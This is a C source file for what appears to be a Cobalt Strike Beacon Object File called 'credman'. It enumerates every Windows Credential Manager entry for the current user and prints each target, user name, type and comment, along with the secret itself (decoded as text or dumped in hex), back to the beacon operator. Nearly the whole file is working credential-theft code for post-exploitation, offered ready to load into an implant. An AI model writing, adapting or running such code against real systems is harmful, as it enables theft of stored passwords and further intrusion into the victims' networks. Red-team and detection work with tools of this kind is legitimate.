/*
 * credman - dump Windows Credential Manager entries for the current user.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const char *cred_type(DWORD t)
{
    switch (t) {
    case CRED_TYPE_GENERIC:                 return "generic";
    case CRED_TYPE_DOMAIN_PASSWORD:         return "domain-password";
    case CRED_TYPE_DOMAIN_CERTIFICATE:      return "domain-certificate";
    case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "domain-visible-password";
    case 5:                                 return "generic-certificate";
    case 6:                                 return "domain-extended";
    }
    return "unknown";
}

static void print_blob(const BYTE *blob, DWORD len)
{
    DWORD i;
    int wide = (len >= 2 && len % 2 == 0);

    if (!blob || !len) return;

    for (i = 1; i < len && wide; i += 2) {
        if (blob[i] != 0) wide = 0;
    }

    if (wide) {
        char tmp[512];
        bof_w2a((const wchar_t *)blob, tmp, sizeof(tmp));
        BeaconPrintf(CALLBACK_OUTPUT, "    Secret : %s\n", tmp);
    } else {
        char hex[3];
        BeaconPrintf(CALLBACK_OUTPUT, "    Secret : ");
        for (i = 0; i < len && i < 128; i++) {
            bof_hex(blob[i], 2, hex);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", hex);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", len > 128 ? "..." : "");
    }
}

void go(char *args, int alen)
{
    PCREDENTIALA *creds = NULL;
    DWORD count = 0, i;
    (void)args; (void)alen;

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &count, &creds)) {
        BeaconPrintf(CALLBACK_ERROR, "CredEnumerate failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Credential Manager entries: %lu\n", (unsigned long)count);

    for (i = 0; i < count; i++) {
        PCREDENTIALA c = creds[i];
        BeaconPrintf(CALLBACK_OUTPUT, "\n[%lu] %s\n", (unsigned long)(i + 1),
                     c->TargetName ? c->TargetName : "(null)");
        if (c->UserName)
            BeaconPrintf(CALLBACK_OUTPUT, "    User   : %s\n", c->UserName);
        BeaconPrintf(CALLBACK_OUTPUT, "    Type   : %s (%lu)\n", cred_type(c->Type), (unsigned long)c->Type);
        BeaconPrintf(CALLBACK_OUTPUT, "    Persist: %lu\n", (unsigned long)c->Persist);
        if (c->Comment)
            BeaconPrintf(CALLBACK_OUTPUT, "    Comment: %s\n", c->Comment);
        print_blob(c->CredentialBlob, c->CredentialBlobSize);
    }

    ADVAPI32$CredFree(creds);
}
